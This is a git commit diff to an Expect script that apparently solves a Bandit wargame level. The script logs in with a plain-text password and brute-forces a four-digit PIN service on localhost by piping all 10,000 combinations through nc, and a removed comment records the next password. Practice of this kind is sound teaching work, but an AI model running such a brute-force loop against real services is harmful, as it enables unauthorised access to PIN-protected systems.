d721645c10cc52512f62fd7860dd01309880c1c4
Christopher <chrispritchard.nz@gmail.com>
2019-06-06 16:40:33 +1200

    simpler solution using echo as originally written

--- Bandit/bandit24.sh
+++ Bandit/bandit24.sh
@@ -5,18 +5,9 @@ expect "*: "
 send "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\r"
 expect "*\$ "
 
-send "nc localhost 30002\r"
+set timeout 30
 
-# the connection gets reset sometimes. so jump to last reset (6900 for me)
-set startLoop 6900
-set endLoop 10000
-# note it succeeded at 8530 with uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
-# this took several hours - a bit of psychology would have suggested maybe count back
+send "for i in \$(seq -f \"%04g\" 0 9999); do echo \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ \$i\"; done | nc localhost 30002 | uniq;\r"
+expect "*\$ "
 
-for {set i $startLoop} {$i < $endLoop} {incr i 1} {
-    set pin "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ [format "%04d" $i]\r"
-    send "$pin"
-    expect "Wrong! Please enter the correct pincode. Try again."
-}
-
-interact
+send "exit\r"
